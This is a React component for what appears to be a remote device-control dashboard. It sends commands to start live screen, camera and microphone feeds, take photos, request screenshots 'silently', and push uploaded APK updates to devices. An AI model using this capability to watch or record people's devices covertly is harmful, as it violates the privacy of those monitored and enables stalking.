import React, { useState, useEffect } from 'react';
import { Camera, Mic, Monitor, Video, ShieldAlert, CheckCircle2, AlertCircle, Play, Square, SwitchCamera, Download, Upload, Smartphone } from 'lucide-react';
import dataService from '../services/dataService';

function RemoteActions({ deviceId, token, fullView = false, toggles, setToggles, devices = [] }) {
  const [status, setStatus] = useState({ loading: false, message: '', type: '' });
  
  const [cameraFacing, setCameraFacing] = useState('FRONT');
  const [apkFile, setApkFile] = useState(null);
  const [versionName, setVersionName] = useState('');
  const [versionCode, setVersionCode] = useState('');
  const [uploadProgress, setUploadProgress] = useState(0);
  const [uploading, setUploading] = useState(false);
  const [updates, setUpdates] = useState([]);
  const [pushingDevices, setPushingDevices] = useState({});

  const showStatus = (msg, type) => {
    setStatus({ loading: false, message: msg, type });
    setTimeout(() => setStatus({ loading: false, message: '', type: '' }), 5000);
  };

  const handleToggle = async (feedType) => {
    if (!deviceId) return;
    setStatus({ loading: true, message: `Updating ${feedType} feed...`, type: 'info' });
    
    try {
      const isCurrentlyOn = toggles[feedType];
      
      if (feedType === 'screen') {
        if (!isCurrentlyOn) {
          await dataService.startLiveView(deviceId, token); // sends START_SCREEN_FEED
        } else {
          await dataService.stopLiveView(deviceId, token); // sends STOP_SCREEN_FEED
        }
      } else if (feedType === 'camera') {
        const cmd = !isCurrentlyOn ? 'START_CAMERA_FEED' : 'STOP_CAMERA_FEED';
        // if turning on, send FRONT or BACK as payload
        const payload = !isCurrentlyOn ? cameraFacing : null;
        await dataService.sendCommandPayload(token, deviceId, cmd, payload);
      } else if (feedType === 'mic') {
        const cmd = !isCurrentlyOn ? 'START_MIC_FEED' : 'STOP_MIC_FEED';
        await dataService.sendCommandPayload(token, deviceId, cmd, null);
      }
      
      setToggles(prev => ({ ...prev, [feedType]: !isCurrentlyOn }));
      showStatus(`${feedType.toUpperCase()} feed ${!isCurrentlyOn ? 'started' : 'stopped'}.`, 'success');
      
    } catch (error) {
      showStatus(`Failed to update ${feedType} feed.`, 'error');
    }
  };

  const handleScreenshot = async () => {
    if (!deviceId) return;
    setStatus({ loading: true, message: `Requesting screenshot...`, type: 'info' });
    try {
      await dataService.sendCommandPayload(token, deviceId, 'TAKE_SCREENSHOT', null);
      showStatus('Screenshot requested silently.', 'success');
    } catch (error) {
      showStatus('Failed to request screenshot.', 'error');
    }
  };

  useEffect(() => {
    if (token) {
      dataService.getAppUpdates(token).then(r => setUpdates(r.data || [])).catch(() => {});
    }
  }, [token]);

  const handleApkUpload = async () => {
    if (!apkFile || !versionName || !versionCode) return;
    setUploading(true);
    setUploadProgress(0);
    try {
      const res = await dataService.uploadAppUpdate(token, apkFile, versionName, parseInt(versionCode, 10), (e) => {
        if (e.total) setUploadProgress(Math.round((e.loaded / e.total) * 100));
      });
      setUpdates(prev => [res.data, ...prev]);
      showStatus(`APK v${versionName} uploaded!`, 'success');
      setApkFile(null);
      setVersionName('');
      setVersionCode('');
    } catch (e) {
      showStatus('Upload failed: ' + (e.response?.data?.detail || e.message), 'error');
    }
    setUploading(false);
    setUploadProgress(0);
  };

  const handlePushUpdate = async (deviceId, update) => {
    setPushingDevices(prev => ({ ...prev, [deviceId]: true }));
    try {
      await dataService.pushAppUpdate(token, deviceId, update.version_code, update.version_name, update.s3_key);
      showStatus(`Update pushed to device #${deviceId}`, 'success');
    } catch (e) {
      showStatus('Push failed: ' + (e.response?.data?.detail || e.message), 'error');
    }
    setPushingDevices(prev => ({ ...prev, [deviceId]: false }));
  };

  return (
    <div className="space-y-8 animate-in fade-in duration-500">
      <div className="bg-white rounded-3xl p-8 border border-slate-200">
        <div className="flex justify-between items-start mb-10">
          <div>
            <h3 className="text-2xl font-black text-slate-900 tracking-tight">Independent AV Controls</h3>
            <p className="text-sm text-slate-500 mt-1 font-medium">Manage streams individually for this device</p>
          </div>
          <ShieldAlert className="w-8 h-8 text-indigo-500" />
        </div>

        {status.message && (
          <div className={`mb-8 p-4 rounded-2xl flex items-center animate-in zoom-in duration-300 ${
            status.type === 'success' ? 'bg-emerald-50 text-emerald-700' : 
            status.type === 'error' ? 'bg-rose-50 text-rose-700' : 'bg-blue-50 text-blue-700'
          }`}>
            {status.type === 'success' ? <CheckCircle2 className="w-5 h-5 mr-3" /> : 
             <AlertCircle className="w-5 h-5 mr-3" />}
            <span className="text-xs font-black uppercase tracking-widest">{status.message}</span>
          </div>
        )}

        <div className="grid grid-cols-1 md:grid-cols-3 gap-8">
          
          {/* Screen Toggle */}
          <div className={`p-6 rounded-3xl border-2 transition-all ${toggles.screen ? 'border-indigo-500 bg-indigo-50/50' : 'border-slate-100 bg-white'}`}>
            <div className="flex justify-between items-center mb-6">
              <div className={`p-3 rounded-2xl ${toggles.screen ? 'bg-indigo-500 text-white' : 'bg-slate-100 text-slate-500'}`}>
                <Monitor className="w-6 h-6" />
              </div>
              <div className={`px-3 py-1 rounded-full text-[10px] font-black uppercase tracking-widest ${toggles.screen ? 'bg-emerald-100 text-emerald-600' : 'bg-slate-100 text-slate-500'}`}>
                {toggles.screen ? 'LIVE' : 'OFFLINE'}
              </div>
            </div>
            <h4 className="font-bold text-slate-900 mb-1">Screen Feed</h4>
            <p className="text-xs text-slate-500 font-medium mb-6">Stream device display</p>
            
            <button
              onClick={() => handleToggle('screen')}
              disabled={status.loading || !deviceId}
              className={`w-full py-3 rounded-2xl text-xs font-black uppercase tracking-widest flex items-center justify-center transition-all ${
                toggles.screen ? 'bg-rose-100 text-rose-600 hover:bg-rose-200' : 'bg-indigo-600 text-white hover:bg-indigo-700'
              }`}
            >
              {toggles.screen ? <Square className="w-4 h-4 mr-2" /> : <Play className="w-4 h-4 mr-2" />}
              {toggles.screen ? 'Stop Feed' : 'Start Feed'}
            </button>
            {toggles.screen && (
              <div className="mt-4 text-center animate-in slide-in-from-bottom-2">
                <span className="text-[10px] bg-indigo-100 text-indigo-700 px-3 py-1.5 rounded-full font-bold uppercase tracking-widest flex items-center justify-center">
                  <Monitor className="w-3 h-3 mr-1" /> Streaming Below
                </span>
              </div>
            )}
          </div>

          {/* Camera Toggle */}
          <div className={`p-6 rounded-3xl border-2 transition-all ${toggles.camera ? 'border-purple-500 bg-purple-50/50' : 'border-slate-100 bg-white'}`}>
            <div className="flex justify-between items-center mb-6">
              <div className={`p-3 rounded-2xl ${toggles.camera ? 'bg-purple-500 text-white' : 'bg-slate-100 text-slate-500'}`}>
                <Camera className="w-6 h-6" />
              </div>
              <div className={`px-3 py-1 rounded-full text-[10px] font-black uppercase tracking-widest ${toggles.camera ? 'bg-emerald-100 text-emerald-600' : 'bg-slate-100 text-slate-500'}`}>
                {toggles.camera ? 'LIVE' : 'OFFLINE'}
              </div>
            </div>
            <h4 className="font-bold text-slate-900 mb-1">Camera Feed</h4>
            <p className="text-xs text-slate-500 font-medium mb-4">Stream device camera</p>
            
            <div className="flex bg-slate-100 rounded-xl p-1 mb-4">
               <button 
                 disabled={toggles.camera}
                 onClick={() => setCameraFacing('FRONT')}
                 className={`flex-1 py-1.5 text-[10px] font-black uppercase tracking-widest rounded-lg transition-all ${cameraFacing === 'FRONT' ? 'bg-white shadow-sm text-slate-900' : 'text-slate-500 hover:text-slate-700'}`}
               >
                 Front
               </button>
               <button 
                 disabled={toggles.camera}
                 onClick={() => setCameraFacing('BACK')}
                 className={`flex-1 py-1.5 text-[10px] font-black uppercase tracking-widest rounded-lg transition-all ${cameraFacing === 'BACK' ? 'bg-white shadow-sm text-slate-900' : 'text-slate-500 hover:text-slate-700'}`}
               >
                 Back
               </button>
            </div>

            <div className="flex bg-slate-100 rounded-xl p-1 mb-4">
               <button 
                 disabled={toggles.camera || status.loading}
                 onClick={async () => {
                   if (!deviceId) return;
                   setStatus({ loading: true, message: `Requesting photo...`, type: 'info' });
                   try {
                     await dataService.sendCommandPayload(token, deviceId, 'TAKE_PHOTO', cameraFacing);
                     showStatus('Photo requested. It will appear in Gallery.', 'success');
                   } catch (error) {
                     showStatus('Failed to request photo.', 'error');
                   }
                 }}
                 className="w-full py-1.5 text-[10px] font-black uppercase tracking-widest rounded-lg transition-all bg-indigo-100 text-indigo-700 hover:bg-indigo-200"
               >
                 Take Photo
               </button>
            </div>

            <button
              onClick={() => handleToggle('camera')}
              disabled={status.loading || !deviceId}
              className={`w-full py-3 rounded-2xl text-xs font-black uppercase tracking-widest flex items-center justify-center transition-all ${
                toggles.camera ? 'bg-rose-100 text-rose-600 hover:bg-rose-200' : 'bg-purple-600 text-white hover:bg-purple-700'
              }`}
            >
              {toggles.camera ? <Square className="w-4 h-4 mr-2" /> : <Play className="w-4 h-4 mr-2" />}
              {toggles.camera ? 'Stop Feed' : 'Start Feed'}
            </button>
            {toggles.camera && (
              <div className="mt-4 text-center animate-in slide-in-from-bottom-2">
                <span className="text-[10px] bg-purple-100 text-purple-700 px-3 py-1.5 rounded-full font-bold uppercase tracking-widest flex items-center justify-center">
                  <Camera className="w-3 h-3 mr-1" /> Streaming Below
                </span>
              </div>
            )}
          </div>

          {/* Mic Toggle */}
          <div className={`p-6 rounded-3xl border-2 transition-all ${toggles.mic ? 'border-rose-500 bg-rose-50/50' : 'border-slate-100 bg-white'}`}>
            <div className="flex justify-between items-center mb-6">
              <div className={`p-3 rounded-2xl ${toggles.mic ? 'bg-rose-500 text-white' : 'bg-slate-100 text-slate-500'}`}>
                <Mic className="w-6 h-6" />
              </div>
              <div className={`px-3 py-1 rounded-full text-[10px] font-black uppercase tracking-widest ${toggles.mic ? 'bg-emerald-100 text-emerald-600' : 'bg-slate-100 text-slate-500'}`}>
                {toggles.mic ? 'LIVE' : 'OFFLINE'}
              </div>
            </div>
            <h4 className="font-bold text-slate-900 mb-1">Microphone Feed</h4>
            <p className="text-xs text-slate-500 font-medium mb-6">Stream device audio</p>
            
            <button
              onClick={() => handleToggle('mic')}
              disabled={status.loading || !deviceId}
              className={`w-full py-3 rounded-2xl text-xs font-black uppercase tracking-widest flex items-center justify-center transition-all ${
                toggles.mic ? 'bg-slate-900 text-white hover:bg-slate-800' : 'bg-rose-600 text-white hover:bg-rose-700'
              }`}
            >
              {toggles.mic ? <Square className="w-4 h-4 mr-2" /> : <Play className="w-4 h-4 mr-2" />}
              {toggles.mic ? 'Stop Feed' : 'Start Feed'}
            </button>
            {toggles.mic && (
              <div className="mt-4 text-center animate-in slide-in-from-bottom-2">
                <span className="text-[10px] bg-rose-100 text-rose-700 px-3 py-1.5 rounded-full font-bold uppercase tracking-widest flex items-center justify-center">
                  <Mic className="w-3 h-3 mr-1" /> Streaming Below
                </span>
              </div>
            )}
          </div>
          
        </div>
        
        <div className="mt-8 border-t border-slate-100 pt-8 flex justify-center">
             <button
              onClick={handleScreenshot}
              disabled={status.loading || !deviceId}
              className="px-8 py-3 bg-slate-100 hover:bg-slate-200 text-slate-700 rounded-2xl text-xs font-black uppercase tracking-widest flex items-center transition-all"
             >
               <Monitor className="w-4 h-4 mr-2" /> Request Screenshot
              </button>
        </div>

        {/* App Update Section */}
        <div className="mt-8 border-t border-slate-100 pt-8">
          <div className="flex justify-between items-start mb-6">
            <div>
              <h4 className="text-lg font-black text-slate-900 tracking-tight">App Update</h4>
              <p className="text-xs text-slate-500 font-medium mt-1">Upload a new APK and push to devices</p>
            </div>
            <Upload className="w-6 h-6 text-indigo-500" />
          </div>

          <div className="grid grid-cols-1 md:grid-cols-2 gap-4 mb-6">
            <div>
              <label className="block text-[10px] font-black uppercase tracking-widest text-slate-400 mb-1">Version Name</label>
              <input
                type="text" value={versionName} onChange={e => setVersionName(e.target.value)}
                placeholder="e.g. 1.2.0"
                className="w-full px-4 py-2.5 rounded-xl border border-slate-200 text-sm font-medium focus:outline-none focus:border-indigo-400"
              />
            </div>
            <div>
              <label className="block text-[10px] font-black uppercase tracking-widest text-slate-400 mb-1">Version Code (number)</label>
              <input
                type="number" value={versionCode} onChange={e => setVersionCode(e.target.value)}
                placeholder="e.g. 12"
                className="w-full px-4 py-2.5 rounded-xl border border-slate-200 text-sm font-medium focus:outline-none focus:border-indigo-400"
              />
            </div>
          </div>

          <div className="flex items-center gap-3 mb-4">
            <label className="flex-1 px-4 py-2.5 rounded-xl border-2 border-dashed border-slate-200 text-xs font-medium text-slate-500 hover:border-indigo-300 cursor-pointer transition-all text-center">
              {apkFile ? apkFile.name : 'Choose APK File (.apk)'}
              <input type="file" accept=".apk,application/vnd.android.package-archive" className="hidden"
                onChange={e => setApkFile(e.target.files[0])} />
            </label>
            <button
              onClick={handleApkUpload}
              disabled={!apkFile || !versionName || !versionCode || uploading}
              className="px-6 py-2.5 bg-indigo-600 text-white rounded-xl text-xs font-black uppercase tracking-wider hover:bg-indigo-700 disabled:opacity-40 transition-all"
            >
              {uploading ? `${uploadProgress}%` : 'Upload'}
            </button>
          </div>

          {uploading && (
            <div className="w-full bg-slate-100 rounded-full h-2 mb-4">
              <div className="bg-indigo-600 h-2 rounded-full transition-all duration-300" style={{ width: `${uploadProgress}%` }} />
            </div>
          )}

          {updates.length > 0 && (
            <div className="space-y-3">
              <h5 className="text-xs font-black uppercase tracking-widest text-slate-400">Available Updates</h5>
              {updates.map(u => (
                <div key={u.id} className="flex items-center justify-between p-4 bg-slate-50 rounded-2xl border border-slate-200">
                  <div>
                    <p className="font-bold text-slate-900 text-sm">v{u.version_name}</p>
                    <p className="text-xs text-slate-400">Code {u.version_code} &middot; {(u.file_size / 1024 / 1024).toFixed(1)} MB</p>
                  </div>
                  <div className="flex items-center gap-2">
                    {(devices.length > 0 ? devices : [{ id: deviceId }].filter(Boolean)).map(d => (
                      <button key={d.id}
                        onClick={() => handlePushUpdate(d.id, u)}
                        disabled={pushingDevices[d.id]}
                        className="px-3 py-1.5 bg-slate-800 text-white rounded-lg text-[10px] font-black uppercase tracking-wider hover:bg-slate-900 disabled:opacity-40 transition-all flex items-center gap-1"
                      >
                        <Smartphone className="w-3 h-3" />
                        {pushingDevices[d.id] ? '...' : `#${d.id}`}
                      </button>
                    ))}
                  </div>
                </div>
              ))}
            </div>
          )}
        </div>

      </div>
    </div>
  );
}

export default RemoteActions;
